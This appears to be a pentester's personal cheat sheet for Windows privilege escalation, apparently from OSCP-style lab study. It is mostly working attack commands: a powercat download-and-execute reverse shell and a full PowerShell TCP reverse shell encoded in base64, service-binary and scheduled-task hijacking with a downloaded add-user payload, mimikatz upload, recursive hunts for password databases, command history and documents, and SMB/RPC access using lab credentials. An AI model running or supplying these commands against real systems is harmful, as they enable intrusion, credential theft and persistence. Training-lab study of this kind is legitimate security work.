```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```
### CHECK IF CMD OR PS
```
git ; (dir 2>&1 *|echo CMD);&<# rem #>echo PowerShell
```
### POWERCAT ONE LINER
```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
```
URL ENCODE AND SEND IT

## SEIMPERSONATE EXPLOITS
https://jlajara.gitlab.io/Potatoes_Windows_Privesc
PRINTSPOOFER
### IMPROVING WINDOWS SHELL
You can use -file or -command perhaps to have it run non-interactively or you could also use projects such as [https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1](https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1 "https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1")
### BASIC ENUMERATION

to see the current user  
```
whoami
```
to see the groups current user is in
```
whoami /groups
```
cmd to get a list of all local users
```
Get-LocalUser
```
enumrate the exisitng groups on the current machine 
```
Get-LocalGroup
```
to check the members of a particular group
```
Get-LocalGroupMember <group-name>
```
```
Get-LocalGroupMember Administrators
```
run this cmd for more info abt the system
```
systeminfo
```

to list all network interfaces,
```
ipconfig /all
```
to list all active connections 
```
netstat -ano
```
```
dir /s *.txt
```
Checking the installed apps on the system
32-bit apps:
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
64-bit apps:
```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```
check the running processes
```
Get-Process
```

To search the directory of a specific process, after running get-process,
```
(Get-Process -Id 2552).Path
```

cmd to search for the password manager databases on the system  with [**Get-ChildItem**](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem) in PowerShell.
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Searching for sensitive information in configuration files of XAMPP
```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

Searching for documents and text files in the home directory of the users
```
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```


TO SEARCH FOR A SPECIFIC FILE
```
Get-ChildItem -Path C:\ -Include *build.ps1* -File -Recurse -ErrorAction SilentlyContinue
```
### CMD to list all files List All Files Recursively in `C:\Users`

```
Get-ChildItem -Path C:\Users -Recurse -File -ErrorAction SilentlyContinue
```

If you want full paths only:
```
Get-ChildItem -Path C:\Users -Recurse -File -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
```


### COMMAND HISTORY

cmd to get powershell history of a user
```
Get-History
```
**Alternate way**
This cmd will show the path of the history file from PSReadline.
```
(Get-PSReadlineOption).HistorySavePath
```
 We can then read the file using 
```
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```


### ACCESS  TO FILES AND FOLDERS

```
icacls "path"
```
![[Pasted image 20250729223024.png]]
trf the accesschk.exe binary adn use  
```
C:\users\tim\accesschk.exe "PATH"
```
checked for the specific user using 
```
C:\users\tim\accesschk.exe <user> "PATH"
```
for recursive checking use
```
accesschk.exe -s USER "PATH"
```
will check the folder and all its subfolders

### SERVICES
#### PS
to see all the running services
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
the we find about a specific one using 
```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'Bonjour Service'}
```
CMD TO CHECK WHO STARTS THE SERVICE IN PS
```
Get-WmiObject -Class Win32_Service -Filter "Name='SERVICE-NAME'" | Select-Object Name, StartName
```
CMD TO CHECK  PATH STARTING USER AS WELL AS SRTATE AND NAME 
```
Get-WmiObject -Class Win32_Service -Filter "Name='SERVICENAME'" | Select-Object Name,State, StartName,Pathname
```
check startup type
```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

Get All Services with User They Run As
```
Get-WmiObject Win32_Service | Select-Object Name, StartName, State
```
if it is auto, can try to shutdown using 
```
shutdown /r /t 0
```
and get the check when it starts as root
CMD TO SE STATUS OF A SERVICE
```
Get-Service -name 'KiteService'
```

```
accesschk.exe -udwq *
```
#### CMD
```
sc query type= service state= all
```

```
sc query auditTracker
```

CMD TO CHECK SERVICE DETAILS IN CMD
```
sc qc freeswitch
```


### START AND STOP SERVICE
```
Start-Service 'Bonjour Service'
```
```
Stop-Service 'Bonjour Service'
```

```
net stop <service-name>
```
```
net start <service-name>
```

### POWERUP CMD TO CHECK
```
Get-ModifiableServiceFile
```

## DLL Hijacking

Enumerating the downloaded applications
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```


### Unquoted Service Paths

enumerating running and stoped services
```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

to list the services vuln to this vuln, run this in cmd
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
check if we an start adn stop that service by running 
```
Start-Service GammaService
```

we then trf over the adduser.exe and save it as current.exe
```
iwr -uri http://192.168.48.3/adduser.exe -Outfile Current.exe
```
```
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

### POWERUP UNQUOTED SERVICE PATH
run this in powerup
```
Get-UnquotedService
```
to find files vuln the nrun this 
```
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```
path should be the vuln path, adn it wil create a user called john with the pwd `Password123!`
```
Restart-Service GammaService
```

## Scheduled Tasks

run below cmd to see scheduled tasks
```
schtasks /query /fo LIST /v
```

```
iwr -Uri http://192.168.48.3/adduser.exe -Outfile BackendCacheCleanup.exe
```

```
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
```

```
move .\BackendCacheCleanup.exe .\Pictures\
```





### ENCODING A PS CMD REV SHELL

Then follow the below cmds to encode it using powershell
```
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.207",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' 
```
```
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
```
```
$EncodedText =[Convert]::ToBase64String($Bytes) 
```
```
$EncodedText
```



### Impacket tools
psexec and wmiexec are shipped with built in feature for file transfer. **Note**: By default whether you upload (lput) or download (lget) a file, it'll be writte in `C:\Windows` path. Uploading mimikatz.exe to the target machine:

```
C:\Windows\system32> lput mimikatz.exe [*] Uploading mimikatz.exe to ADMIN$\/ 
```
```
C:\Windows\system32> cd C:\windows C:\Windows> dir /b mimikatz.exe mimikatz.exe
```
Downloading mimikatz.log:
```
C:\Windows> lget mimikatz.log [*] Downloading ADMIN$\mimikatz.log
```

### EVIL-WINRM

Uploading files:
```
upload mimikatz.exe C:\windows\tasks\mimikatz.exe
```

Downloading files:
```
download mimikatz.log /home/kali/Documents/pen-200
```



## WINPEAS
cmd to add colour and prettify winpeas output 
```
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```


### RUN CMD AS ANOTHER USER
requires interactive shell
```
runas /user:backupadmin cmd
```
run this script to run cmds as a diff user
```
Invoke-RunasCs user pwd 'cmd'
```
can trf a msfvenom shell and run that as the cmd


### SMB CONNECTION
LIST ALL SHARES
```
smbclient -L //192.168.162.175/ -N
```
CONNECT WITH A NULL SESSION
```
smbclient //192.168.162.175/ -N
```
to connectu sing id/pss, amd user is in a domain
```
smbclient //192.168.162.175/'Password Audit' -U 'resourced.local/V.Ventz'
```
USING CME/NXC
```
crackmapexec smb 192.168.162.175 -u V.Ventz -p 'HotelCalifornia194!' --shares
```
```
nxc smb 192.168.162.175 -u V.Ventz -p 'HotelCalifornia194!' --shares
```


### RPC CONNECTION
```
rpcclient 192.168.162.175 -U "" -N
```
then run these cmds
```
enumdomusers
```
```
enumdomgroups
```
change pwd using rpc
```
net rpc password "jackie" "testPASS1!" -U "sub.poseidon.yzx"/"lisa"%"LisaWayToGo456" -S "192.168.116.162"
```

### MALICIOUS BINARY GENERATOR

https://github.com/0bfxgh0st/MMG-LO/


### GOBUSTER
TO EXCLUDE LENGTHS
```
sudo gobuster dir -w '/home/kali/Desktop/wordlists/dirbuster/directory-list-2.3-medium.txt' -u http://$IP:80 -t 42 -b 400,403,404 --exclude-length 2166
```

## LOOKUP DEFAULT-PASSWORDS.CSV


## DOWNLOAD NETCAT
```
powershell iwr http://192.168.45.154/nc64.exe -outfile nc64.exe
```
